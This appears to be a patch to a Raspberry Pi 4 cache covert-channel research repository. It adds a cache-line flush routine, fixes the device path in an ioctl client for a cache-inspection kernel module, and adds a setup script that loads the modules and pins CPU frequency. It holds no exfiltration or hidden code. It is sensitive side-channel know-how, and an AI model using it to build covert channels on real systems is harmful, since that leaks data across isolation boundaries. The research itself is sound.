+diff --git a/covert-channel/kernel-modules/rpi4-module-cache/user/ioctl.c b/covert-channel/kernel-modules/rpi4-module-cache/user/ioctl.c
+index 508df5e..5afd8c5 100644
+--- a/covert-channel/kernel-modules/rpi4-module-cache/user/ioctl.c
++++ b/covert-channel/kernel-modules/rpi4-module-cache/user/ioctl.c
+@@ -107,6 +107,13 @@ Mapping allocate_mapping(size_t mem_size) {
+ 	return mapping;
+ }
+ 
++void flush_mapping(Mapping* mapping) {
++	for (uint8_t* ptr = mapping->base_addr; ptr < mapping->base_addr + mapping->size; ptr += CACHE_LINE_WIDTH) {
++		flush(ptr);
++	}
++	mfence();
++}
++
+ int main() {
+ 	// Reserve some memory for the kernel module to deliver query results
+ 	// into. The size corresponds to the maximum possible number of results
+@@ -135,13 +142,13 @@ int main() {
+ 			.pa_size = pa.size,
+ 		// result memory information
+ 			.resp_l1 = (size_t*)resp_l1.base_addr,
+-	    	.resp_l1_size = resp_l1.size,
++			.resp_l1_size = resp_l1.size,
+ 			.resp_l2 = (size_t*)resp_l2.base_addr,
+-	    	.resp_l2_size = resp_l2.size
++			.resp_l2_size = resp_l2.size
+ 	};
+ 
+ 	// open device file for communication with the kernel module
+-	cache_dev_fd = open(DEVICE_FILE_NAME, 0);
++	cache_dev_fd = open("/dev/" DEVICE_FILE_NAME, 0);
+ 	if (cache_dev_fd < 0) {
+ 		printf ("Can't open device file: %s\n", DEVICE_FILE_NAME);
+ 		exit(-1);
+@@ -150,6 +157,8 @@ int main() {
+ 	// send setup struct to kernel module
+ 	ioctl_setup(&setup);
+ 
++	flush_mapping(&pa);
++
+ 	// perform some memory accesses
+ 	// (NB: the memory area is not flushed, so some entries might be in
+ 	// cache anyway as remeainder of the allocation of the mapping!)
+@@ -187,4 +196,4 @@ int main() {
+ 	}
+ 	
+ 	close(cache_dev_fd);
+-}
+\ No newline at end of file
++}
+diff --git a/setup.sh b/setup.sh
+new file mode 100644
+index 0000000..0ca303d
+--- /dev/null
++++ b/setup.sh
+@@ -0,0 +1,26 @@
++#!/bin/bash
++set -xe
++
++cd covert-channel/kernel-modules
++
++echo "Loading cache module"
++cd rpi4-module-cache
++make clean
++make
++sudo bash module_load.sh
++cd ..
++
++echo "Loading CCR module"
++cd rpi4-module-ccr/armv8
++make clean
++make
++sudo bash module_load.sh
++cd ..
++
++cd
++
++echo "Fixing CPU frequency"
++sudo cpufreq-set -c 0 -f 1.8GHz
++sudo cpufreq-set -c 1 -f 1.8GHz
++sudo cpufreq-set -c 2 -f 1.8GHz
++sudo cpufreq-set -c 3 -f 1.8GHz
